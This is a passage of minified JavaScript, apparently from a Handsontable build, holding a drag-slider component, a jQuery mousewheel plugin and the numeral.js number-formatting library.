t=document.onmouseup||function(){};document.onmouseup=function(n){t(n);e.documentUpHandler(n)};var n=document.ontouchend||function(){};document.ontouchend=function(t){n(t);e.documentUpHandler(t)};var r=window.onresize||function(){};window.onresize=function(t){r(t);e.documentResizeHandler(t)};this.wrapper.onmousemove=function(t){e.activity=true};this.wrapper.onclick=function(t){return!e.activity};this.interval=setInterval(function(){e.animate()},25);e.animate(false,true)},handleDownHandler:function(e){this.activity=false;Cursor.refresh(e);this.preventDefaults(e,true);this.startDrag()},wrapperDownHandler:function(e){Cursor.refresh(e);this.preventDefaults(e,true);this.startTap()},documentUpHandler:function(e){this.stopDrag();this.stopTap()},documentResizeHandler:function(e){this.setWrapperOffset();this.setBounds();this.update()},enable:function(){this.disabled=false;this.handle.className=this.handle.className.replace(/\s?disabled/g,"")},disable:function(){this.disabled=true;this.handle.className+=" disabled"},setStep:function(e,t,n){this.setValue(this.steps&&e>1?(e-1)/(this.steps-1):0,this.steps&&t>1?(t-1)/(this.steps-1):0,n)},setValue:function(e,t,n){this.setTargetValue([e,t||0]);if(n){this.groupCopy(this.value.current,this.value.target)}},startTap:function(e){if(this.disabled){return}this.tapping=true;this.setWrapperOffset();this.setBounds();if(e===undefined){e=[Cursor.x-this.offset.wrapper[0]-this.handle.offsetWidth/2,Cursor.y-this.offset.wrapper[1]-this.handle.offsetHeight/2]}this.setTargetOffset(e)},stopTap:function(){if(this.disabled||!this.tapping){return}this.tapping=false;this.setTargetValue(this.value.current);this.result()},startDrag:function(){if(this.disabled){return}this.setWrapperOffset();this.setBounds();this.offset.mouse=[Cursor.x-Position.get(this.handle)[0],Cursor.y-Position.get(this.handle)[1]];this.dragging=true},stopDrag:function(){if(this.disabled||!this.dragging){return}this.dragging=false;var e=this.groupClone(this.value.current);if(this.slide){var t=this.change;e[0]+=t[0]*4;e[1]+=t[1]*4}this.setTargetValue(e);this.result()},feedback:function(){var e=this.value.current;if(this.snap&&this.steps>1){e=this.getClosestSteps(e)}if(!this.groupCompare(e,this.value.prev)){if(typeof this.animationCallback=="function"){this.animationCallback(e[0],e[1])}this.groupCopy(this.value.prev,e)}},result:function(){if(typeof this.callback=="function"){this.callback(this.value.target[0],this.value.target[1])}},animate:function(e,t){if(e&&!this.dragging){return}if(this.dragging){var n=this.groupClone(this.value.target);var r=[Cursor.x-this.offset.wrapper[0]-this.offset.mouse[0],Cursor.y-this.offset.wrapper[1]-this.offset.mouse[1]];this.setTargetOffset(r,this.loose);this.change=[this.value.target[0]-n[0],this.value.target[1]-n[1]]}if(this.dragging||t){this.groupCopy(this.value.current,this.value.target)}if(this.dragging||this.glide()||t){this.update();this.feedback()}},glide:function(){var e=[this.value.target[0]-this.value.current[0],this.value.target[1]-this.value.current[1]];if(!e[0]&&!e[1]){return false}if(Math.abs(e[0])>this.bounds.xStep||Math.abs(e[1])>this.bounds.yStep){this.value.current[0]+=e[0]*this.speed;this.value.current[1]+=e[1]*this.speed}else{this.groupCopy(this.value.current,this.value.target)}return true},update:function(){if(!this.snap){this.offset.current=this.getOffsetsByRatios(this.value.current)}else{this.offset.current=this.getOffsetsByRatios(this.getClosestSteps(this.value.current))}this.show()},show:function(){if(!this.groupCompare(this.offset.current,this.offset.prev)){if(this.horizontal){this.handle.style.left=String(this.offset.current[0])+"px"}if(this.vertical){this.handle.style.top=String(this.offset.current[1])+"px"}this.groupCopy(this.offset.prev,this.offset.current)}},setTargetValue:function(e,t){var n=t?this.getLooseValue(e):this.getProperValue(e);this.groupCopy(this.value.target,n);this.offset.target=this.getOffsetsByRatios(n)},setTargetOffset:function(e,t){var n=this.getRatiosByOffsets(e);var r=t?this.getLooseValue(n):this.getProperValue(n);this.groupCopy(this.value.target,r);this.offset.target=this.getOffsetsByRatios(r)},getLooseValue:function(e){var t=this.getProperValue(e);return[t[0]+(e[0]-t[0])/4,t[1]+(e[1]-t[1])/4]},getProperValue:function(e){var t=this.groupClone(e);t[0]=Math.max(t[0],0);t[1]=Math.max(t[1],0);t[0]=Math.min(t[0],1);t[1]=Math.min(t[1],1);if(!this.dragging&&!this.tapping||this.snap){if(this.steps>1){t=this.getClosestSteps(t)}}return t},getRatiosByOffsets:function(e){return[this.getRatioByOffset(e[0],this.bounds.xRange,this.bounds.x0),this.getRatioByOffset(e[1],this.bounds.yRange,this.bounds.y0)]},getRatioByOffset:function(e,t,n){return t?(e-n)/t:0},getOffsetsByRatios:function(e){return[this.getOffsetByRatio(e[0],this.bounds.xRange,this.bounds.x0),this.getOffsetByRatio(e[1],this.bounds.yRange,this.bounds.y0)]},getOffsetByRatio:function(e,t,n){return Math.round(e*t)+n},getClosestSteps:function(e){return[this.getClosestStep(e[0]),this.getClosestStep(e[1])]},getClosestStep:function(e){var t=0;var n=1;for(var r=0;r<=this.steps-1;r++){if(Math.abs(this.stepRatios[r]-e)<n){n=Math.abs(this.stepRatios[r]-e);t=r}}return this.stepRatios[t]},groupCompare:function(e,t){return e[0]==t[0]&&e[1]==t[1]},groupCopy:function(e,t){e[0]=t[0];e[1]=t[1]},groupClone:function(e){return[e[0],e[1]]},preventDefaults:function(e,t){if(!e){e=window.event}if(e.preventDefault){e.preventDefault()}e.returnValue=false;if(t&&document.selection){document.selection.empty()}},cancelEvent:function(e){if(!e){e=window.event}if(e.stopPropagation){e.stopPropagation()}e.cancelBubble=true}};(function(e){if(typeof define==="function"&&define.amd){define(["jquery"],e)}else if(typeof exports==="object"){module.exports=e}else{e(jQuery)}})(function(e){function o(t){var n=t||window.event,s=[].slice.call(arguments,1),o=0,u=0,a=0,f=0,l=0,c;t=e.event.fix(n);t.type="mousewheel";if(n.wheelDelta){o=n.wheelDelta}if(n.detail){o=n.detail*-1}if(n.deltaY){a=n.deltaY*-1;o=a}if(n.deltaX){u=n.deltaX;o=u*-1}if(n.wheelDeltaY!==undefined){a=n.wheelDeltaY}if(n.wheelDeltaX!==undefined){u=n.wheelDeltaX*-1}f=Math.abs(o);if(!r||f<r){r=f}l=Math.max(Math.abs(a),Math.abs(u));if(!i||l<i){i=l}c=o>0?"floor":"ceil";o=Math[c](o/r);u=Math[c](u/i);a=Math[c](a/i);s.unshift(t,o,u,a);return(e.event.dispatch||e.event.handle).apply(this,s)}var t=["wheel","mousewheel","DOMMouseScroll","MozMousePixelScroll"];var n="onwheel"in document||document.documentMode>=9?["wheel"]:["mousewheel","DomMouseScroll","MozMousePixelScroll"];var r,i;if(e.event.fixHooks){for(var s=t.length;s;){e.event.fixHooks[t[--s]]=e.event.mouseHooks}}e.event.special.mousewheel={setup:function(){if(this.addEventListener){for(var e=n.length;e;){this.addEventListener(n[--e],o,false)}}else{this.onmousewheel=o}},teardown:function(){if(this.removeEventListener){for(var e=n.length;e;){this.removeEventListener(n[--e],o,false)}}else{this.onmousewheel=null}}};e.fn.extend({mousewheel:function(e){return e?this.bind("mousewheel",e):this.trigger("mousewheel")},unmousewheel:function(e){return this.unbind("mousewheel",e)}})})})(jQuery,window,Handsontable);(function(){function o(e){this._n=e}function u(e,t,n){var r=Math.pow(10,t),i;i=(Math.round(e*r)/r).toFixed(t);if(n){var s=new RegExp("0{1,"+n+"}$");i=i.replace(s,"")}return i}function a(e,t){var n;if(t.indexOf("$")>-1){n=l(e,t)}else if(t.indexOf("%")>-1){n=c(e,t)}else if(t.indexOf(":")>-1){n=h(e,t)}else{n=d(e,t)}return n}function f(e,t){if(t.indexOf(":")>-1){e._n=p(t)}else{if(t===i){e._n=0}else{var s=t;if(n[r].delimiters.decimal!=="."){t=t.replace(/\./g,"").replace(n[r].delimiters.decimal,".")}var o=new RegExp(n[r].abbreviations.thousand+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$"),u=new RegExp(n[r].abbreviations.million+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$"),a=new RegExp(n[r].abbreviations.billion+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$"),f=new RegExp(n[r].abbreviations.trillion+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$");var l=["KB","MB","GB","TB","PB","EB","ZB","YB"],c=false;for(var h=0;h<=l.length;h++){c=t.indexOf(l[h])>-1?Math.pow(1024,h+1):false;if(c){break}}e._n=(c?c:1)*(s.match(o)?Math.pow(10,3):1)*(s.match(u)?Math.pow(10,6):1)*(s.match(a)?Math.pow(10,9):1)*(s.match(f)?Math.pow(10,12):1)*(t.indexOf("%")>-1?.01:1)*Number((t.indexOf("(")>-1?"-":"")+t.replace(/[^0-9\.-]+/g,""));e._n=c?Math.ceil(e._n):e._n}}return e._n}function l(e,t){var i=t.indexOf("$")<=1?true:false;var s="";if(t.indexOf(" $")>-1){s=" ";t=t.replace(" $","")}else if(t.indexOf("$ ")>-1){s=" ";t=t.replace("$ ","")}else{t=t.replace("$","")}var o=a(e,t);if(i){if(o.indexOf("(")>-1||o.indexOf("-")>-1){o=o.split("");o.splice(1,0,n[r].currency.symbol+s);o=o.join("")}else{o=n[r].currency.symbol+s+o}}else{if(o.indexOf(")")>-1){o=o.split("");o.splice(-1,0,s+n[r].currency.symbol);o=o.join("")}else{o=o+s+n[r].currency.symbol}}return o}function c(e,t){var n="";if(t.indexOf(" %")>-1){n=" ";t=t.replace(" %","")}else{t=t.replace("%","")}e._n=e._n*100;var r=a(e,t);if(r.indexOf(")")>-1){r=r.split("");r.splice(-1,0,n+"%");r=r.join("")}else{r=r+n+"%"}return r}function h(e,t){var n=Math.floor(e._n/60/60),r=Math.floor((e._n-n*60*60)/60),i=Math.round(e._n-n*60*60-r*60);return n+":"+(r<10?"0"+r:r)+":"+(i<10?"0"+i:i)}function p(e){var t=e.split(":"),n=0;if(t.length===3){n=n+Number(t[0])*60*60;n=n+Number(t[1])*60;n=n+Number(t[2])}else if(t.lenght===2){n=n+Number(t[0])*60;n=n+Number(t[1])}return Number(n)}function d(e,t){var s=false,o=false,a="",f="",l="",c=Math.abs(e._n);if(e._n===0&&i!==null){return i}else{if(t.indexOf("(")>-1){s=true;t=t.slice(1,-1)}if(t.indexOf("a")>-1){if(t.indexOf(" a")>-1){a=" ";t=t.replace(" a","")}else{t=t.replace("a","")}if(c>=Math.pow(10,12)){a=a+n[r].abbreviations.trillion;e._n=e._n/Math.pow(10,12)}else if(c<Math.pow(10,12)&&c>=Math.pow(10,9)){a=a+n[r].abbreviations.billion;e._n=e._n/Math.pow(10,9)}else if(c<Math.pow(10,9)&&c>=Math.pow(10,6)){a=a+n[r].abbreviations.million;e._n=e._n/Math.pow(10,6)}else if(c<Math.pow(10,6)&&c>=Math.pow(10,3)){a=a+n[r].abbreviations.thousand;e._n=e._n/Math.pow(10,3)}}if(t.indexOf("b")>-1){if(t.indexOf(" b")>-1){f=" ";t=t.replace(" b","")}else{t=t.replace("b","")}var h=["B","KB","MB","GB","TB","PB","EB","ZB","YB"],p,d;for(var v=0;v<=h.length;v++){p=Math.pow(1024,v);d=Math.pow(1024,v+1);if(e._n>=p&&e._n<d){f=f+h[v];if(p>0){e._n=e._n/p}break}}}if(t.indexOf("o")>-1){if(t.indexOf(" o")>-1){l=" ";t=t.replace(" o","")}else{t=t.replace("o","")}l=l+n[r].ordinal(e._n)}if(t.indexOf("[.]")>-1){o=true;t=t.replace("[.]",".")}var m=e._n.toString().split(".")[0],g=t.split(".")[1],y=t.indexOf(","),b="",w=false;if(g){if(g.indexOf("[")>-1){g=g.replace("]","");g=g.split("[");b=u(e._n,g[0].length+g[1].length,g[1].length)}else{b=u(e._n,g.length)}m=b.split(".")[0];if(b.split(".")[1].length){b=n[r].delimiters.decimal+b.split(".")[1]}else{b=""}if(o&&Number(b)===0){b=""}}else{m=u(e._n,null)}if(m.indexOf("-")>-1){m=m.slice(1);w=true}if(y>-1){m=m.toString().replace(/(\d)(?=(\d{3})+(?!\d))/g,"$1"+n[r].delimiters.thousands)}if(t.indexOf(".")===0){m=""}return(s&&w?"(":"")+(!s&&w?"-":"")+m+b+(l?l:"")+(a?a:"")+(f?f:"")+(s&&w?")":"")}}function v(e,t){n[e]=t}var e,t="1.4.7",n={},r="en",i=null,s=typeof module!=="undefined"&&module.exports;e=function(t){if(e.isNumeral(t)){t=t.value()}else if(!Number(t)){t=0}return new o(Number(t))};e.version=t;e.isNumeral=function(e){return e instanceof o};e.language=function(t,i){if(!t){return r}if(t&&!i){r=t}if(i||!n[t]){v(t,i)}return e};e.language("en",{delimiters:{thousands:",",decimal:"."},abbreviations:{thousand:"k",million:"m",billion:"b",trillion:"t"},ordinal:function(e){var t=e%10;return~~(e%100/10)===1?"th":t===1?"st":t===2?"nd":t===3?"rd":"th"},currency:{symbol:"$"}});e.zeroFormat=function(e){if(typeof e==="string"){i=e}else{i=null}};e.fn=o.prototype={clone:function(){return e(this)},format:function(t){return a(this,t?t:e.defaultFormat)},unformat:function(t){return f(this,t?t:e.defaultFormat)},value:function(){return this._n},valueOf:function(){return this._n},set:function(e){this._n=Number(e);return this},add:function(e){this._n=this._n+Number(e);return this},subtract:function(e){this._n=this._n-Number(e);return this},multiply:function(e){this._n=this._n*Number(e);return this},divide:function(e){this._n=this._n/Number(e);return this},difference:function(e){var t=this._n-Number(e);if(t<0){t=-t}return t}};if(s){module.exports=e}if(typeof ender==="undefined"){this["numeral"]=e}if(typeof define==="function"&&define.amd){define([],function(){return e})}}).call(this);